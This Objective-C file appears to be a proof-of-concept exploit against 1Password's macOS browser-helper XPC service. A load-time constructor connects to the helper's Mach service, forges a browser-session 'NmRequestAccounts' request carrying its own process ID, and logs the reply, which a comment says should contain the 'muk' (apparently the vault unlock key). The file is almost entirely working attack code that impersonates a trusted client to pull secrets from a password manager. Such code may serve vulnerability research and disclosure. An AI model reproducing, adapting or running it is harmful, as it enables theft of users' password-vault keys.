#import <Foundation/Foundation.h>

@protocol ExportedProtocol
- (void)receive:(NSData *)arg1 requestId:(NSString *)arg2;
@end

@protocol RemoteProtocol
- (void)sendToMain:(NSData *)arg1 reply:(void (^)(NSData *))arg2;
- (void)echo:(NSData *)arg1 reply:(void (^)(NSData *))arg2;
@end

@interface ExportedObject : NSXPCInterface
{
}

- (void)receive:(id)arg1 requestId:(id)arg2;
@end

@implementation ExportedObject
- (void)receive:(NSData *)arg1 requestId:(NSString *)arg2 {
    NSString *strData = [[NSString alloc]initWithData:arg1 encoding:NSUTF8StringEncoding];
    NSString *newStr = [strData substringFromIndex:4];

    NSLog(@"received response from main, which should contain muk: %@",newStr);
    //  NSLog(@"received --TARGETOUTPUTSTART--|%@|--TARGETOUTPUTEND--", arg1);
    exit(0);
}
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
{
    NSString*  _serviceName = @"2BUA8C4S2C.com.1password.browser-helper";
    NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:0];
    
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    unsigned int processID = [processInfo processIdentifier];
    NSString* pidString = [NSString stringWithFormat:@"%d",processID];
    NSLog(@"Our pid is %@", pidString);
    char pre[] = "{\"callbackId\":3,\"clientInfo\":{\"pid\":";
    NSData *preData = [NSData dataWithBytes:pre length:sizeof(pre)-1];
    NSData* pid = [pidString dataUsingEncoding:NSUTF8StringEncoding];
    char post[] = ",\"session\":{\"type\":\"Browser\"}},\"invocation\":{\"type\":\"NmRequestAccounts\",\"content\":{\"version\":1,\"userRequested\":true,\"supportsDelegation\":true}}}";
    NSData *postData = [NSData dataWithBytes:post length:sizeof(post)-1];

    NSMutableData *msg = [NSMutableData data];
    [msg appendData:preData];
    [msg appendData:pid];
    [msg appendData:postData]; 

    // Calculate size of message, prepend with 4 bytes 
    int messageSize = (sizeof(pre)-1) + (sizeof(post)-1) + [pidString length];
    [msg replaceBytesInRange:NSMakeRange(0, 0) withBytes:(const void *)&messageSize length:sizeof(messageSize)];
    ExportedObject *obj = [[ExportedObject alloc] init];

    [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(RemoteProtocol)]];
    [_agentConnection setExportedInterface:[NSXPCInterface interfaceWithProtocol:@protocol(ExportedProtocol)]];
    [_agentConnection setExportedObject:obj];
    [_agentConnection resume];
    
    NSLog(@"sending %@", msg);

    NSLog(@"calling echo to check successful connection");
    [[_agentConnection synchronousRemoteObjectProxyWithErrorHandler:^(NSError* error) {
        NSLog(@"error during echo:");
        NSLog(@"%@", error);
    }]
     echo:msg reply:^(NSData *response){
        NSLog(@"response was:");
        NSLog(@"%@", response);
    }
    ];
    NSLog(@"calling sendToMain");
    [[_agentConnection synchronousRemoteObjectProxyWithErrorHandler:^(NSError* error) {
        NSLog(@"printing error:");
        NSLog(@"%@", error);
    }]
     sendToMain:msg reply:^(NSData *response){
        NSLog(@"response was:");
        NSLog(@"%@", response);
        exit(0);
    }
    ];
    [NSThread sleepForTimeInterval:2.0f];

    NSLog(@"Done!");
    exit(0);
    return;
}
